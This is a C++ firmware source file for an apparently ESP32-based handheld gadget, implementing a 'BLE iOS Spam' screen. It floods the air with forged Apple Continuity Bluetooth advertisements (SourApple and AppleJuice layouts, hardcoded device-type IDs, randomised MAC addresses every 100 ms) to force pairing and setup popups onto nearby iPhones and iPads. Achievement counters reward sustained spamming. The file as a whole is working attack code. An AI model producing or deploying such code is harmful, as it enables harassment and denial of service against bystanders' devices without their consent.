#include "BLEiOSSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

// Apple device type IDs for Continuity proximity pairing (IOS1) and setup (IOS2)
static const uint8_t kIOS1[] = {
  0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
  0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
};
static const uint8_t kIOS2[] = {
  0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
  0x0b, 0x09, 0x02, 0x1e, 0x24
};

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLEiOSSpamScreen::~BLEiOSSpamScreen()
{
  _stop();
}

void BLEiOSSpamScreen::onInit()
{
  int n = Achievement.inc("ble_ios_spam_first");
  if (n == 1) Achievement.unlock("ble_ios_spam_first");
  _spamStartMs   = millis();
  _spam1minFired = false;

  NimBLEDevice::init("");
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  _pAdv = NimBLEDevice::getAdvertising();
  _spam();
}

void BLEiOSSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.goBack();
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_ios_spam_1min");
    if (m == 1) Achievement.unlock("ble_ios_spam_1min");
  }
  if (now - _lastSpamMs >= 100) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLEiOSSpamScreen::onRender()
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  String label = String("[") + _spinner[_spinIdx] + "] Spamming...";
  sp.drawString(label.c_str(), bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLEiOSSpamScreen::_spam()
{
  if (_pAdv) _pAdv->stop();

  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  if (random(2) == 0) {
    // SourApple — proximity pairing action popup (0x0F)
    static constexpr uint8_t kTypes[] = {
      0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
    };
    uint8_t rand3a[3], rand3b[3];
    esp_fill_random(rand3a, 3);
    esp_fill_random(rand3b, 3);
    // mfg: Apple(2) + type 0x0F + len 0x05 + flags + typeId + rand(3) + 0x00 0x00 0x10 + rand(3) = 15 bytes
    uint8_t mfg[15] = {
      0x4C, 0x00,
      0x0F, 0x05, 0xC1,
      kTypes[random(sizeof(kTypes))],
      rand3a[0], rand3a[1], rand3a[2],
      0x00, 0x00, 0x10,
      rand3b[0], rand3b[1], rand3b[2]
    };
    advData.setManufacturerData(std::string((char*)mfg, 15));
  } else {
    // AppleJuice — Continuity proximity pairing / setup popup
    if (random(2) == 0) {
      // Proximity pairing (0x07) — triggers AirPods-style popup
      uint8_t mfg[24] = {
        0x4C, 0x00,
        0x07, 0x19, 0x07,
        kIOS1[random(sizeof(kIOS1))],
        0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
        0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      };
      advData.setManufacturerData(std::string((char*)mfg, 24));
    } else {
      // Setup popup (0x04) — triggers "Set up new device" style popup
      uint8_t mfg[21] = {
        0x4C, 0x00,
        0x04, 0x04, 0x2a,
        0x00, 0x00, 0x00,
        0x0f, 0x05, 0xc1,
        kIOS2[random(sizeof(kIOS2))],
        0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
      };
      advData.setManufacturerData(std::string((char*)mfg, 21));
    }
  }

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLEiOSSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}